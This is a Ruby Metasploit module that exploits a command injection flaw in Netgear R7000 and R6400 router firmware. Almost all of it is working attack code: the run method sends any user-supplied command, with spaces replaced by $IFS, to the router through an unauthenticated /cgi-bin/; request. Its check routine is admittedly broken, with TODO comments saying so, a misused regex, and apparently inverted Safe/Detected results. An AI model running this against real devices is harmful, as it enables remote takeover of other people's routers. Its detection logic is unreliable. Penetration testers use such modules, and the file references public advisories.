##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient #For sending the http request
  include Rex::Proto::Http

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Netgear R7000 and R6400 Command Injection",
      'Description'          => %q{
        This module exploits an arbitrary command injection vulnerability in
        Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['linux'],
      'Author'               => ['thecarterb', 'Acew0rm'],
      'Targets'              => [
        [ 'Netgear firmware v1.0.7.2_1.1.93', { } ]
      ],
      'DefaultTarget'        => 0,
      'References'           =>
        [
          [ 'EDB', '40889'],
          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'],
          [ 'URL', 'https://www.kb.cert.org/vuls/id/582384']
        ],
      'DisclosureDate' => 'Dec 06 2016'
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'The remote target address', nil]),
        OptString.new('CMD',   [true, 'Command line to execute', nil ]),
      ], self.class)
    end

#taken from Dolibarr login utility, not really sure if it will work or not
#Requests the login page which discloses the hardware, if it's an R7000 or R6400, return Detected
def check
  res = send_request_raw({
    'method' => 'HEAD',
    'uri'    => normalize_uri(@uri)
  })
      # TODO: fix line 52, this isn't working right
      #This is supposed to parse the WWW-Authenticate: Basic realm="ROUTER HARDWARE"
      m = res.body.match(/Basic realm="NETGEAR R7000"/ || /Basic realm="NETGEAR R6400"/)

      #TODO: fix this workaround and regex stuff
      if m != nil
        return Exploit::CheckCode::Safe
      else
        return Exploit::CheckCode::Detected
      end
end

  def run
    #Main Function
    #convert datastores to variables
    cmd   = datastore['CMD']
    rhost = datastore['RHOST']

    print_status("Sending request to #{rhost}")

    #replace spaces with $IFS in CMD
    cmd = cmd.gsub! ' ', '$IFS'

    begin
      #send the request containing the edited command
      send_request_raw({'uri' => "/cgi-bin/;#{cmd}"})
    rescue Rex::ConnectionTimeout => ct
      print_error(ct.message)
    rescue Rex::ConnectionError => ce
      print_error(ce.message)
    rescue Rex::ConnectionRefused => cr
      print_error(cr.message)
    rescue Rex::Exception => e
      print_error(e.message)
    end
  end
end
